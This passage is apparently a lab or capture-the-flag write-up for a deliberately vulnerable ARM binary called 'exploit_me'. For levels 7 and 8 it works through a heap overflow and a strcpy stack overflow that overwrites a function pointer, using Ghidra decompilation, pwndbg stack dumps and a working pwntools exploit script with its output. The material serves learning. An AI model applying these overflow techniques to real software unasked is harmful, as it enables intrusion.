11:0044│     0x407ffd04 ◂— 1
12:0048│     0x407ffd08 ◂— 0
13:004c│     0x407ffd0c —▸ 0x408001aa ◂— '70756'
14:0050│     0x407ffd10 ◂— 0
15:0054│     0x407ffd14 —▸ 0x408001aa ◂— '70756'
16:0058│     0x407ffd18 —▸ 0x7c000 ◂— 0
17:005c│     0x407ffd1c ◂— 0x21 /* '!' */
18:0060│     0x407ffd20 ◂— 0x3e8
19:0064│     0x407ffd24 —▸ 0x407fffc4 —▸ 0x4080017c ◂— '/home/dvader/exploit_me/bin/exploit'
1a:0068│     0x407ffd28 —▸ 0x793b8 —▸ 0x104c5 ◂— movtne r7, #0x4a4a
1b:006c│     0x407ffd2c ◂— 0
1c:0070│     0x407ffd30 —▸ 0x407fffd8 —▸ 0x408001b0 ◂— 'COLORFGBG=15;0'
1d:0074│     0x407ffd34 ◂— 3
1e:0078│     0x407ffd38 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
1f:007c│     0x407ffd3c —▸ 0x1d887 ◂— ldrhteq r0, [sp], r0
20:0080│     0x407ffd40 ◂— 1
21:0084│     0x407ffd44 —▸ 0x7d150 —▸ 0x7a288 —▸ 0x62f6c ◂— andeq r0, r0, r3, asr #32 /* 'C' */
22:0088│     0x407ffd48 —▸ 0x407ffe6c —▸ 0x1ceb5 ◂— mrceq p14, #7, r4, c12, c0, #7
23:008c│ r11 0x407ffd4c —▸ 0x11464 ◂— push {r11, lr}
'''
'''
└─$ ./l3.py          
[+] Starting local process '/usr/bin/qemu-arm': pid 3028538
[*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-n_qsz3l3.gdb']
[+] Receiving all data: Done (66B)
[*] Process '/usr/bin/qemu-arm' stopped with exit code 29 (pid 3028538)
b'filling array position 33 with 70756\nLevel 4 Password: "mysecret"\n'
'''
```

# exploit_me ARM binary - level 7:

in ghidra:
```
undefined4 FUN_0001113c_level_7(undefined4 param_1)

{
  int iVar1;
  
                    /* size of 44 */
  iVar1 = FUN_0001367c(0x2c);
  *(undefined4 *)(iVar1 + 0x28) = 0;
  FUN_00032b50(iVar1,param_1);
  FUN_0001e5e8_printf("Heap magic number: 0x%x\n",*(undefined4 *)(iVar1 + 0x28));
  if (*(int *)(iVar1 + 0x28) == 0x6763) {
    FUN_0001e5e8_printf("Level 8 Password: \"%s\"\n",s_Exploiter_0007c2ea);
  }
  if (iVar1 != 0) {
    thunk_FUN_000310dc(iVar1);
  }
  return 0;
}
```

### strategy:

Manual testing, started seeing the input value reflected in the output after a given length:
```
└─$ ./exploit mypony fffffffffffffffffffffffffffffffffffffffff
Heap magic number: 0x66
```

In ghidra, saw 0x2c and 0x28 used around our input. 0x28 == 40 so I wanted to test input of length 40. at length of 40, it's the boundary
and the magic number is 0x0. however, at 41, the magic number becomes the byte of our input.

Verifying 0x28 and its relation to our input, the following decompilation looked interesting:
```
if (*(int *)(iVar1 + 0x28) == 0x6763) {
FUN_0001e5e8_printf("Level 8 Password: \"%s\"\n",s_Exploiter_0007c2ea);
}
```

Placing a 0x67 and 0x63 at input bytes 41 and 42, we passed the level:
```
└─$ ./exploit mypony ffffffffffffffffffffffffffffffffffffffffcg
Heap magic number: 0x6763
Level 8 Password: "Exploiter"
```

# exploit_me ARM binary - level 8:
```
#!/home/dvader/tools/pwntools/bin/python3

from pwn import *

context(arch='arm', bits=32, endian='little')
''' ### enter tmux before running ### '''
context.terminal = ["tmux", "splitw", "-h"]


cmd = 'whoami'

binary_args = ['/home/dvader/exploit_me/bin/exploit', 'Exploiter', cmd]

gdb_commands = '''
set debuginfod enabled off
set exec-wrapper env -i
#b *0x110e8
continue
'''

context.gdb_binary = "/usr/local/bin/pwndbg"
io = gdb.debug(binary_args, gdbscript=gdb_commands)

print(io.recvuntil(b'Current b ptr, addr: '))
addr = int(io.recv(7).strip(), 16)

print(addr)
print(hex(addr))

print(io.recvall(timeout=2))
io.clean()
io.close()

### SECOND EXECUTION - allows for less hardcoded values/addresses ###
cmd2 = cyclic(72) # buf of 72 - the next address we want to fill with the pointer to the level 9 function
cmd2 += p32(addr)
io = process(['/home/dvader/exploit_me/bin/exploit', 'Exploiter', cmd2])


if args.INTERACTIVE:
    io.interactive()
else:
    print(io.recvall(timeout=2))


''' Learned (LX) '''

# L0 - 
# L1 - 
# L2 - 


''' Remembered (RX) '''

# R0 - 


''' To Do (TX) '''

# T0 - 


'''
in ghidra - level 8 function:
```
undefined4 FUN_00010fe8_level_8(undefined4 param_1)

{
  undefined4 *puVar1;
  undefined4 local_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined4 local_50;
  undefined4 uStack_4c;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 local_28;
  undefined4 uStack_24;
  undefined4 *local_20;
  undefined4 local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  
  puVar1 = (undefined4 *)FUN_0001367c(4);
  *puVar1 = 0;
  FUN_00013508_ptr_to_print_level_9_password_here(puVar1);
  local_20 = puVar1;
                    /* local_20 stores the function pointer to get the password for level 9? */
  puVar1 = (undefined4 *)FUN_0001367c(4);
  *puVar1 = 0;
  FUN_0001353c(puVar1);
  local_18 = puVar1;
  local_14 = puVar1;
  FUN_0001e5e8_printf("Current g ptr, addr: %p\n",puVar1);
  FUN_0001e5e8_printf("Current b ptr, addr: %p,%lx\n",local_20,&local_20);
  uStack_5c = *(undefined4 *)((undefined1  [16])0x0 + (undefined1  [16])0x4);
  uStack_58 = *(undefined4 *)((undefined1  [16])0x0 + (undefined1  [16])0x8);
  uStack_54 = *(undefined4 *)((undefined1  [16])0x0 + (undefined1  [16])0xc);
  local_60 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_1c = 0;
  uStack_4c = uStack_5c;
  uStack_44 = uStack_5c;
  uStack_3c = uStack_5c;
  uStack_34 = uStack_5c;
  uStack_2c = uStack_5c;
  uStack_24 = uStack_5c;
  FUN_00032b50_strcpy(&local_60,param_1);                 # unbounded strcpy()
  (**(code **)*local_18)(local_18,&local_60);
  if (local_14 != (undefined4 *)0x0) {
    FUN_000310dc_free(local_14);
  }
  if (local_20 != (undefined4 *)0x0) {
    FUN_000310dc_free(local_20);
  }
  return 0;
}
```

####################################################

ghidra - pointer to level 9 password:
```
undefined4 * FUN_00013508_ptr_to_print_level_9_password_here(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_000134a8_level_9_print_password_here_0005fac8;
  return param_1;
}
```

####################################################

ghidra - level 9 password print function:

```
void FUN_000134a8_level_9_print_password_here
               (undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  FUN_0001e5e8_printf("Level 9 Password: \"%s\", welcome %s\n",s_Gimme_0007c2f8,param_2,param_4,
                      param_2,param_1);
  return;
}
```


'''


'''
Strategy - manual testing:

```
└─$ ./exploit Exploiter                                        
usage: ./exploit Exploiter <cmd>
```
```
└─$ ./exploit Exploiter hi
Current g ptr, addr: 0x861d8
Current b ptr, addr: 0x861c8,407ffd70
sh: 1: hi: not found
```
```
└─$ ./exploit Exploiter ls
Current g ptr, addr: 0x861d8
Current b ptr, addr: 0x861c8,407ffd70
arm  arm64  core.919813  dir1  exploit  exploit64  exploit_strings.txt  level2  level3  level4  level7  level8
```
```
└─$ ./exploit Exploiter $(python -c "print('A'*64)")
Current g ptr, addr: 0x861d8
Current b ptr, addr: 0x861c8,407ffd30
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
free(): invalid size
qemu: uncaught target signal 6 (Aborted) - core dumped
zsh: IOT instruction  ./exploit Exploiter $(python -c "print('A'*64)")
```


'''


'''
in pwndbg - stack w/ input of size 48 to show stack layout before overwrite:

pwndbg> stack 48
│00:0000│ sp     0x407ffa88 ◂— 0
│01:0004│        0x407ffa8c —▸ 0x407fff75 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaa
│ajaaakaaalaaa'
│02:0008│ r0 r12 0x407ffa90 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
│03:000c│        0x407ffa94 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
│04:0010│        0x407ffa98 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
│05:0014│        0x407ffa9c ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaa'
│06:0018│        0x407ffaa0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaa'
│07:001c│        0x407ffaa4 ◂— 'faaagaaahaaaiaaajaaakaaalaaa'
│08:0020│        0x407ffaa8 ◂— 'gaaahaaaiaaajaaakaaalaaa'
│09:0024│        0x407ffaac ◂— 'haaaiaaajaaakaaalaaa'
│0a:0028│        0x407ffab0 ◂— 'iaaajaaakaaalaaa'
│0b:002c│        0x407ffab4 ◂— 'jaaakaaalaaa'
│0c:0030│        0x407ffab8 ◂— 'kaaalaaa'
│0d:0034│        0x407ffabc ◂— 'laaa'
│0e:0038│        0x407ffac0 ◂— 0
│... ↓           3 skipped
│12:0048│        0x407ffad0 —▸ 0x861c8 —▸ 0x5fac8 —▸ 0x134a8 ◂— push {r11, lr}    # 0x134a8 is address of level 9 password print function
│13:004c│        0x407ffad4 ◂— 0
│14:0050│        0x407ffad8 —▸ 0x861d8 —▸ 0x5fabc —▸ 0x134e0 ◂— push {r11, lr}    # need to overwrite this pointer to level 9 password print

####################################################

in pwndbg - after overwrite of size 72 + pointer to level 9 password:

pwndbg> stack 48
│00:0000│ sp     0x407ffa68 ◂— 0
│01:0004│        0x407ffa6c —▸ 0x407fff5a ◂— 0x61616161 ('aaaa')
│02:0008│ r0 r12 0x407ffa70 ◂— 0x61616161 ('aaaa')
│03:000c│        0x407ffa74 ◂— 0x61616162 ('baaa')
│04:0010│        0x407ffa78 ◂— 0x61616163 ('caaa')
│05:0014│        0x407ffa7c ◂— 0x61616164 ('daaa')
│06:0018│        0x407ffa80 ◂— 0x61616165 ('eaaa')
│07:001c│        0x407ffa84 ◂— 0x61616166 ('faaa')
│08:0020│        0x407ffa88 ◂— 0x61616167 ('gaaa')
│09:0024│        0x407ffa8c ◂— 0x61616168 ('haaa')
│0a:0028│        0x407ffa90 ◂— 0x61616169 ('iaaa')
│0b:002c│        0x407ffa94 ◂— 0x6161616a ('jaaa')
│0c:0030│        0x407ffa98 ◂— 0x6161616b ('kaaa')
│0d:0034│        0x407ffa9c ◂— 0x6161616c ('laaa')
│0e:0038│        0x407ffaa0 ◂— 0x6161616d ('maaa')
│0f:003c│        0x407ffaa4 ◂— 0x6161616e ('naaa')
│10:0040│        0x407ffaa8 ◂— 0x6161616f ('oaaa')
│11:0044│        0x407ffaac ◂— 0x61616170 ('paaa')
│12:0048│        0x407ffab0 ◂— 0x61616171 ('qaaa')
│13:004c│        0x407ffab4 ◂— 0x61616172 ('raaa')
│14:0050│        0x407ffab8 —▸ 0x861c8 —▸ 0x5fac8 —▸ 0x134a8 ◂— push {r11, lr}    # 0x50 from stack overwritten w/ pointer to level 9!
'''


'''
successful - next password:
└─$ ./l8.py
[+] Starting local process '/usr/bin/qemu-arm': pid 1686428
[*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-4l9pzm7y.gdb']
b'Current b ptr, addr: '
549320
0x861c8
[+] Receiving all data: Done (17B)
[*] Process '/usr/bin/qemu-arm' stopped with exit code 0 (pid 1686428)
b',407ffaf0\ndvader\n'
[+] Starting local process '/home/dvader/exploit_me/bin/exploit': pid 1686468
[+] Receiving all data: Done (257B)
[*] Process '/home/dvader/exploit_me/bin/exploit' stopped with exit code -6 (SIGABRT) (pid 1686468)
b'Current g ptr, addr: 0x861d8\nCurrent b ptr, addr: 0x861c8,407ffab0\nLevel 9 Password: "Gimme", welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa\xc8a\x08\nfree(): invalid pointer\nqemu: uncaught target signal 6 (Aborted) - core dumped\n'
'''
```
